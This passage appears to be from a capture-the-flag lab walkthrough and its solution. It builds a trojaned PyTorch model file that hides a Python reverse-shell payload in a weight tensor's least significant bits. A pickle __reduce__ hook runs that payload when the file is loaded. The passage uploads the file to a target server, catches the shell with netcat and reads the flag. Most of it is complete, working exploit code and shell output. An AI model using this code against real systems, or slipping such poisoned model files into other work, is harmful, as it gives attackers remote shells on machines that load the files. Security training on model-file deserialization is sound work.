

To actually execute the actually, we first need to create an instance of `TrojanModelWrapper`, and pass the entire `modified_state_dict` to its constructor, along with the `target_key` (specifying which tensor holds the payload, e.g., `"large_layer.weight"`), as well as the `NUM_LSB` used for encoding. The wrapper's `__init__` method pickles this entire `state_dict` and stores the resulting bytes internally.

We then save this `wrapper_instance` object to our final malicious file (`final_malicious_file`) using `torch.save()`. This file now contains the pickled representation of the `TrojanModelWrapper`.

Code: python

```python
# Ensure the modified state dict exists from the embedding step
if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError(
        "Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."
    )
# Ensure the target key used for embedding is correctly defined
if "target_key" not in locals():
    raise NameError(
        "Critical Error: 'target_key' variable not defined. Cannot create wrapper."
    )

print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    # Create an instance of our wrapper class.
    # Pass the entire modified state dictionary, the key identifying the
    # payload tensor within that dictionary, and the LSB count.
    # The wrapper's __init__ pickles the state_dict internally.
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created successfully.")
    print(
        "The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."
    )

except Exception as e:
    print(f"\n--- Error Instantiating Wrapper ---")
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e


# Define the filename for our final malicious artifact
final_malicious_file = "malicious_trojan_model.pth"

print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f"Final malicious Trojan file saved successfully to '{final_malicious_file}'."
    )
    print(f"File size: {os.path.getsize(final_malicious_file)} bytes.")

except Exception as e:
    # Catch potential errors during the final save operation
    print(f"\n--- Error Saving Final Malicious File ---")
    import traceback

    traceback.print_exc()
    print(f"Error details: {e}")
    raise SystemExit("Failed to save the final malicious wrapper file.") from e
```

The only thing left is to execute the attack.

First we need to double-check the payload configuration. We must ensure the `HOST_IP` variable, set earlier when defining the payload, correctly points to the IP address of the machine where we will run our listener, and that this IP is reachable from the target's environment. Next, we start a network listener on our machine to catch the incoming reverse shell.

A common tool for this is `netcat`; run `nc -lvnp 4444`.

With the listener active, we upload our malicious model file to the spawned instance. The application exposes an `/upload` endpoint designed to receive model files. Use the Python script below (or a tool like `curl`) to perform the upload via an HTTP POST request.

Code: python

```python
import requests
import os
import traceback

api_url = "http://localhost:5555/upload"  # Replace with instance details

pickle_file_path = final_malicious_file

print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")

# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)

        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")

        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )

    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print("  1. The API URL is correct.")
        print("  2. Your target instance is running and the port is mapped correctly.")
        print("  3. There are no network issues (e.g., firewall).")
        print("  4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")

    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")

    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
                # print("Closed file handle for upload.")
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")

print("\nUpload script finished.")
```

Upon successful upload, the server will attempt to load the model using `torch.load()`.

We should see an incoming connection on our `nc` listener. Once we have the shell connection, we can navigate the target's system to find and retrieve the flag (`cat /app/flag.txt`).

1. Using the reverse shell to your target instance, retrieve the flag in flag.txt and submit it as the answer to this question.

Create a netcat listener on port 4444

```
nc -lvnp 4444
```

Execute the below script

```python
import socket
import subprocess
import os
import pty
import sys
import traceback
import torch
import pickle
import struct
import requests
import torch.nn as nn

# First, create a simple victim model with a smaller layer (enough for payload)
class SimpleModel(nn.Module):
    def __init__(self):
        super(SimpleModel, self).__init__()
        self.large_layer = nn.Linear(80, 80)  # Reduced size: 6,400 elements > 6,088 needed

# Instantiate and save the state_dict
model = SimpleModel()
legitimate_state_dict_file = "victim_model_state.pth"
torch.save(model.state_dict(), legitimate_state_dict_file)
print(f"Legitimate model state_dict saved to '{legitimate_state_dict_file}'.")

# Define encode_lsb function
def encode_lsb(tensor_original: torch.Tensor, data_bytes: bytes, num_lsb: int) -> torch.Tensor:
    if tensor_original.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be between 1 and 8.")
    tensor_modified = tensor_original.clone()
    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    # Prefix with 4-byte length
    length = len(data_bytes)
    full_data = struct.pack('>I', length) + data_bytes
    # Convert to bits (MSB first for each byte)
    bits_to_embed = []
    for byte in full_data:
        for i in range(7, -1, -1):
            bits_to_embed.append((byte >> i) & 1)
    total_bits = len(bits_to_embed)
    elements_needed = (total_bits + num_lsb - 1) // num_lsb
    if elements_needed > n_elements:
        raise ValueError("Tensor too small to embed data.")
    bit_index = 0
    element_index = 0
    mask = (1 << num_lsb) - 1
    while bit_index < total_bits and element_index < n_elements:
        current_float = tensor_flat[element_index].item()
        try:
            packed_float = struct.pack('>f', current_float)
            int_rep = struct.unpack('>I', packed_float)[0]
        except struct.error:
            element_index += 1
            continue
        # Clear LSBs
        int_rep &= ~mask
        # Build lsb_value from next bits (first bit highest in LSB group)
        lsb_value = 0
        for _ in range(num_lsb):
            if bit_index < total_bits:
                bit = bits_to_embed[bit_index]
                lsb_value = (lsb_value << 1) | bit
                bit_index += 1
        int_rep |= lsb_value
        # Pack back to float
        new_packed = struct.pack('>I', int_rep)
        new_float = struct.unpack('>f', new_packed)[0]
        tensor_flat[element_index] = new_float
        element_index += 1
    if bit_index < total_bits:
        raise ValueError("Failed to embed all bits.")
    return tensor_modified.view_as(tensor_original)

# Configure connection details for the reverse shell
HOST_IP = "10.10.14.135"  # Replace with your actual VPN/tun0 IP (e.g., run 'ip addr show tun0' to get it)
LISTENER_PORT = 4444

print(f"--- Payload Configuration ---")
print(f"Payload will target: {HOST_IP}:{LISTENER_PORT}")
print(f"-----------------------------")

# The payload string itself
payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([shell]) # Start interactive shell
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1) # Force exit
"""

# Encode payload for steganography
payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")

NUM_LSB = 2  # Number of LSBs to use

# Load the legitimate state dict
legitimate_state_dict_file = "victim_model_state.pth"
if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(
        f"Legitimate state dict '{legitimate_state_dict_file}' not found."
    )
print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
loaded_state_dict = torch.load(legitimate_state_dict_file)  # Load the dictionary
print("State dict loaded successfully.")

# Choose a target layer/tensor for embedding
target_key = "large_layer.weight"
if target_key not in loaded_state_dict:
    raise KeyError(
        f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
    )
original_target_tensor = loaded_state_dict[target_key]
print(
    f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
)

# Ensure the payload isn't too large for the chosen tensor
bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB  # Ceiling division
print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")
if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")

# Encode the payload into the target tensor
print(f"\nEncoding payload into tensor '{target_key}'...")
try:
    modified_target_tensor = encode_lsb(
        original_target_tensor, payload_bytes_to_hide, NUM_LSB
    )
    print("Encoding complete.")
    # Replace the original tensor with the modified one in the dictionary
    modified_state_dict = loaded_state_dict.copy()
    modified_state_dict[target_key] = modified_target_tensor
    print(f"Replaced '{target_key}' in state dict with modified tensor.")
except Exception as e:
    print(f"Error during encoding or state dict modification: {e}")
    raise  # Re-raise the exception

class TrojanModelWrapper:
    """
    A malicious wrapper class designed to act as a Trojan.
    """
    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        """
        Initializes the wrapper, pickling the state_dict for embedding.
        """
        print(
            f" [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
        )
        print(f" [Wrapper Init] Received target_key: '{target_key}'")
        print(f" [Wrapper Init] Received num_lsb: {num_lsb}")
        if target_key not in modified_state_dict:
            raise ValueError(
                f"target_key '{target_key}' not found in the provided state_dict."
            )
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")
        try:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f" [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
            )
        except Exception as e:
            print(f"--- Error pickling state_dict ---")
            print(f"Error: {e}")
            raise RuntimeError(
                "Failed to pickle state_dict for embedding in wrapper."
            ) from e
        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            " [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
        )

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        """
        Exploits pickle deserialization to execute embedded loader code.
        """
        print(
            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
        )
        print(" Preparing loader code string...")
        # Embed the decode_lsb function source code.
        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely trying to read {count} bits.")
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        payload_len_bytes = length_int
        if payload_len_bytes == 0: return b''
        if payload_len_bytes < 0: raise ValueError(f"Decoded negative length: {payload_len_bytes}")
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except ValueError as e: raise ValueError(f"Embedded LSB Decode failed: {e}") from e
    except Exception as e_inner: raise RuntimeError(f"Unexpected Embedded LSB Decode error: {e_inner}") from e_inner
"""
        # Embed necessary data
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb
        print(
            f" [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."
        )
        # Construct the loader code string
        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Trojan Wrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
print('[+] Trojan Wrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
print(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
try:
    print('[+] Trojan Wrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    if not isinstance(reconstructed_state_dict, dict):
        raise TypeError("Deserialized object is not a dictionary (state_dict).")
    print(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
    if target_key not in reconstructed_state_dict:
        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
    payload_tensor = reconstructed_state_dict[target_key]
    if not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
    print(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
    print(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    print(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Trojan Wrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    print('[!] Trojan Wrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()
except Exception as e:
    print(f'[!!!] Trojan Wrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Trojan Wrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
"""
        print(" [Reduce] Loader code string constructed with escaped inner braces.")
        print(" [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")
        return (exec, (loader_code,))

print("TrojanModelWrapper class defined.")

# Ensure the modified state dict exists from the embedding step
if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError(
        "Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."
    )
# Ensure the target key used for embedding is correctly defined
if "target_key" not in locals():
    raise NameError(
        "Critical Error: 'target_key' variable not defined. Cannot create wrapper."
    )
print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    # Create an instance of our wrapper class.
    # Pass the entire modified state dictionary, the key identifying the
    # payload tensor within that dictionary, and the LSB count.
    # The wrapper's __init__ pickles the state_dict internally.
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created successfully.")
    print(
        "The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."
    )
except Exception as e:
    print(f"\n--- Error Instantiating Wrapper ---")
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e
# Define the filename for our final malicious artifact
final_malicious_file = "malicious_trojan_model.pth"
print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f"Final malicious Trojan file saved successfully to '{final_malicious_file}'."
    )
    print(f"File size: {os.path.getsize(final_malicious_file)} bytes.")
except Exception as e:
    # Catch potential errors during the final save operation
    print(f"\n--- Error Saving Final Malicious File ---")
    import traceback
    traceback.print_exc()
    print(f"Error details: {e}")
    raise SystemExit("Failed to save the final malicious wrapper file.") from e

# Upload script
api_url = "http://10.129.85.36:5555/upload"  # Target instance IP/port
pickle_file_path = final_malicious_file
print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")
# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }
    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)
        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")
        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )
    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print(" 1. The API URL is correct.")
        print(" 2. Your target instance is running and the port is mapped correctly.")
        print(" 3. There are no network issues (e.g., firewall).")
        print(" 4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")
    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")
    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")
print("\nUpload script finished.")
```

On our Netcat we will get a reverse shell where we can now get the flag

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.85.36 33788
[PAYLOAD] Spawning shell: /bin/bash
bash: /root/.bashrc: Permission denied
htbuser@69c2f32d2e1b:/app$ cat /app/flag.txt
cat /app/flag.txt
HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}
```

